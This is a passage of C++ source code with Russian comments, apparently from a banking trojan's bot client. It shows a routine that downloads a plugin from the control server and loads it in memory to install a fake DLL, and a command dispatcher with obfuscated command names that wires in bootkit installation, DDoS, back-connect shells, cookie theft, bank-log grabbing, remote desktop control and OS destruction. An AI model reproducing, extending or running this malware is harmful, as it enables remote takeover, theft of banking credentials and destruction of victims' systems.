	string Target            = GetCommandParamByIndex(ParamList, 2);
	
	// После парсинга сразу освобождаем память списка
	STR::Free(ParamList);

	// Для сервера нужны только имена в нижнем регистре
	STR::AnsiLowerCase(InstallerPlugName.t_str());

	TASKDBG("AsyncInstallFakeDll", "Started with InstallerPlugName='%s' BotPlugName='%s' Target='%s'",
		InstallerPlugName.t_str(),
		BotPlugName.t_str(),
		Target.t_str()
		);

	DWORD  InstallerPlugSize = 0;
	LPBYTE InstallerPlug = Plugin::DownloadEx(InstallerPlugName.t_str(), NULL, &InstallerPlugSize, true, false, NULL);
	TASKDBG("AsyncInstallFakeDll", "Download() return body=0x%X size=%d", InstallerPlug, 
		InstallerPlugSize);

	do
	{
		TASKDBG("AsyncInstallFakeDll", "check is plug loaded from network");
		// Проверяем загрузился ли плаг
		if (InstallerPlug == NULL) break;

		// Проверяем формат (PE)
		TASKDBG("AsyncInstallFakeDll", "check file from network for PE");
		if (!IsExecutableFile(InstallerPlug)) break;

		HMEMORYMODULE Module = MemoryLoadLibrary(InstallerPlug);
		TASKDBG("AsyncInstallFakeDll", "MemoryLoadLibrary() result=0x%X", Module);
		if (Module == NULL) break;

		// Installer.plug должен импортировать ф-ции Install(target, body, size).
		typedef BOOL (WINAPI *FakeInstallFunction)(
			const char* BotPlugName, 
			const char* Target, 
			const void* InstallerBody, 
			DWORD InstallerBodySize
			);

		// Получаем и запускаем ф-цию FakeInstall
		FakeInstallFunction FakeInstall = (FakeInstallFunction)MemoryGetProcAddress(Module, "FakeInstall");
		TASKDBG("AsyncInstallFakeDll", "MemoryGetProcAddress('FakeInstall') result=0x%X", FakeInstall);
		
		if (FakeInstall == NULL) break;

		TASKDBG("AsyncInstallFakeDll", "running FakeInstall.");
		BOOL FakeInstallResult = FakeInstall(BotPlugName.t_str(), Target.t_str(), 
			InstallerPlug, InstallerPlugSize);
		
		TASKDBG("AsyncInstallFakeDll", "Installation result=%d.", FakeInstallResult);

		// TODO: По идее тут надо сделать какой-то отчет о результате выполнения команды.
	}
	while (0);

	TASKDBG("AsyncInstallFakeDll", "Finished.");
	if (InstallerPlug) MemFree(InstallerPlug);
}


// Команда скачивания и запуска инсталера FakeAutorunDll
// Команда: installfakedll <InstallerName.plug> <BuildedBotPlugName.plug> [<Target>]
// <InstallerName.plug> - имя инсталятора на сервере
//
// <BuildedBotPlugName.plug> - имя плагина бот со встроенными параметрами для подключения к серверу.
//
// <Target> - необязательный параметр. Указывает конкретные цели установки. Если ничего не указано 
//            ставится по все возможные цели, который поддерживает инсталятор.

bool ExecuteInstallFakeDll(void* Manager, PCHAR Command, PCHAR Args)
{
	// Установку длл разрешаем только в ринг3 и сервисе бота
	if (BOT::GetBotType() != BotRing3 && BOT::GetBotType() != BotService)
		return false;

	TASKDBG("ExecuteInstallFakeDll", "Args: '%s'", Args);

	PCHAR ParamList = STR::New(Args);

	StartThread(AsyncInstallFakeDll, ParamList);
	return true;
}

*/


//---------------------------------------------------------------------------


TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
{
    // Выполнить стандартную команду

	const static char CommandUpdate[]        = {'u','p','d','a','t','e',0};
	const static char CommandUpdateConfig[]  = {'u','p','d','a','t','e','c','o','n','f','i','g' ,0};
	const static char CommandDownload[]      = {'d','o','w','n','l','o','a','d',0};
	const static char CommandLoadDll[]       = {'l','o','a','d','d','l','l',0};
	const static char CommandAlert[]         = {'a', 'l', 'e', 'r', 't', 0};
	const static char CommandUpdateHosts[]   = {'u', 'p', 'd', 'a', 't', 'e', 'h', 'o', 's', 't', 's',  0};
	const static char CommandLoadDLLDisk[]	 = {'l','o','a','d','d','l','l','d','i','s','k', 0};
	const static char CommandDocFind[]		 = {'d','o','c','f','i','n','d', 0};
	const static char CommandRS[]			 = {'r','s', 0};
	const static char CommandRDP[]			 = {'r','d', 'p', 0};
	const static char CommandVNC[]			 = {'v','n', 'c', 0};
	const static char CommandIFobs[]		 = {'i','f', 'o', 'b', 's', 0};
	const static char CommandLF[]			 = {'l','f',0};
	const static char CommandExec[]			 = {'e','x','e','c',0};
	const static char CommandAddTrust[]		 = {'a','d','d','t','r','u','s','t',0};
	const static char CommandDownload2[]     = {'d','o','w','n','l','o','a','d','2',0};
	const static char CommandCBank[]		 = {'c','b','a','n','k',0};
	const static char CommandTiny[]			 = {'t','i','n','y',0};
	

	int Index = StrIndexOf( Command, false, 18,
							(PCHAR)CommandUpdate,
							(PCHAR)CommandUpdateConfig,
							(PCHAR)CommandDownload,
							(PCHAR)CommandLoadDll,
							(PCHAR)CommandAlert,
							(PCHAR)CommandUpdateHosts,
							(PCHAR)CommandLoadDLLDisk,
							(PCHAR)CommandDocFind,
							(PCHAR)CommandRS,
							(PCHAR)CommandRDP,
							(PCHAR)CommandVNC,
							(PCHAR)CommandIFobs,
							(PCHAR)CommandLF,
							(PCHAR)CommandExec,
							(PCHAR)CommandAddTrust,
							(PCHAR)CommandDownload2,
							(PCHAR)CommandCBank,
							(PCHAR)CommandTiny
						  );


	switch (Index)
	{
		case 0: return ExecuteUpdate;
		case 1: return ExecuteUpdateConfig;
		case 2: return ExecuteDownload;
		case 3: return ExecuteLoadDLL;
		case 4: return ExecuteAlert;
		case 5: return Hosts::ExecuteUpdateHostsCommand;
		case 6: return ExecuteLoadDLLDisk;
		case 7: return ExecuteDocFind;
		case 8: return ExecuteRS;
		case 9: return ExecuteRDP;
		case 10: return ExecuteVNC;
		case 11: return ExecuteIFobs;
		case 12: return ExecuteLF;
		case 13: return ExecuteExec;
		case 14: return ExecuteAddTrust;
		case 15: return ExecuteDownload2;
		case 16: return ExecuteCBank;
		case 17: return ExecuteTiny;

    default: ;
	}

	// Ищем команду в списке зарегистрированных
	if (Manager != NULL)
	{
		PRegisteredCommand Cmd = GetRegisteredCommand(Manager, Command);
		if (Cmd != NULL)
			return Cmd->Method;
	}

	return NULL;
}
//---------------------------------------------------------------------------



const char* CommandUpdatePlug = "updateplug";

//const char* Plugin::CommandInstallBk     = "installbk";
//const char* Plugin::CommandInstallBkStat = "install-bk-with-report";




void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
{
	// Регистрируем известные команды бота
	TASKDBG("RegisterAllCommands", "Started with Manager=0x%X Commands=%u", 
		Manager, Commands);


	if (BOT::GetBotType() != BotBootkit)
	{
		RegisterCommand(Manager, GetStr(EStrCommandInstallBootkit).t_str(), ExecuteInstallBootkit);

		// Команда установки Bootkit из плага
//		RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBk, Plugin::ExecuteInstallBk);

		// Команда установки Bootkit из плага c включением статистического отстука
//		RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBkStat, Plugin::ExecuteInstallBkStat);
    }

	// Команда обновления плага
	RegisterCommand(Manager, (PCHAR)CommandUpdatePlug, ExecuteUpdatePlug);

	// Команда установки FakeDll
	if (BOT::GetBotType() != BotFakeDll && BOT::GetBotType() != BotBootkit)
		RegisterCommand(Manager, GetStr(EStrCommandInstallFakeDLL).t_str(), ExecuteInstallFakeDll);

	// Команда grabber
	#ifdef GrabberH
        RegisterCommand(Manager, (PCHAR)CommandGrabber, ExecuteGrabber);
	#endif
	

	//char CommandMultiDownload[] = {'m','u','l','t','i','d','o','w','n','l','o','a','d',0};

	//можем грузить любую длл, какая нам нравиться
	//"loaddll decl:WINAPIV|dll.plug|StartHTTP|c-http://site.com'|i-2|"	
	#ifdef ComandLoadDLLH		
		RegisterCommand(Manager, (PCHAR)CommandLoadDllConnect, ExecuteAllCommand);		
	#endif

	//-------------------------------------------------
	// Команда DDOS
	#ifdef ddosH		
		RegisterCommand(Manager, (PCHAR)CommandDDOS, ExecuteDDOSCommand);		
	#endif
	

	//-------------------------------------------------
	// Команда Back Connect
	#ifdef BackConnectH
        RegisterCommand(Manager, CommandBackConnect, ExecuteBackConnectCommand);
	#endif

	//-------------------------------------------------
	// Команда скрытого браузера
	#ifdef StealthBrowserH		
		char CommandSB[] = {'s','b',0};  //sb 127.0.0.1 9999
		RegisterCommand(Manager, CommandSB, ExecuteSBCommand);
    #endif

	//-------------------------------------------------
	// Команды для раблоты с куками
	#ifdef coocksolH
		RegisterCommand(Manager, (PCHAR)CommandDeleteCookies, ExecuteDeleteCookiesCommand);
		RegisterCommand(Manager, (PCHAR)CommandSendCookies, ExecuteSendCookiesCommand);
	#endif

	#ifdef RuBnkH		
		RegisterCommand(Manager, (PCHAR)Iblock_Url, ExecuteIblock_Url);	
		RegisterCommand(Manager, (PCHAR)Iblock_processblock ,ExecuteIblock_processblock);
	#endif

	#ifdef KillOs_RebootH
		RegisterCommand(Manager, killos, ExecuteKillosCommand);
		RegisterCommand(Manager, Reboot_System, ExecuteRebootCommand);
	#endif
	//-------------------------------------------------

	// собираем данные *.dat %Temp%
	#ifdef		SBERH
		//RegisterCommand(Manager, (PCHAR)GetSberLog, ExecuteGrabSberLogCommand);
		RegisterCommand(Manager, (PCHAR)Sber::GetSbr, Sber::ExecuteGetSbrCommand);
	#endif

	#ifdef JAVS_PATCHERH
		RegisterCommand(Manager, (PCHAR)UpdatePath, ExecuteUpdatePathCommand);
		RegisterCommand(Manager, (PCHAR)DeletePath, ExecuteDeletePathCommand);
	#endif

	#ifdef BitcoinH
		RegisterCommand(Manager, (PCHAR)CommandInstallbtc, ExecuteBitcoin );
	#endif

	#ifdef AmmyyH
		RegisterCommand(Manager, (PCHAR)Ammyy::NameCmd, Ammyy::Execute );
	#endif
}
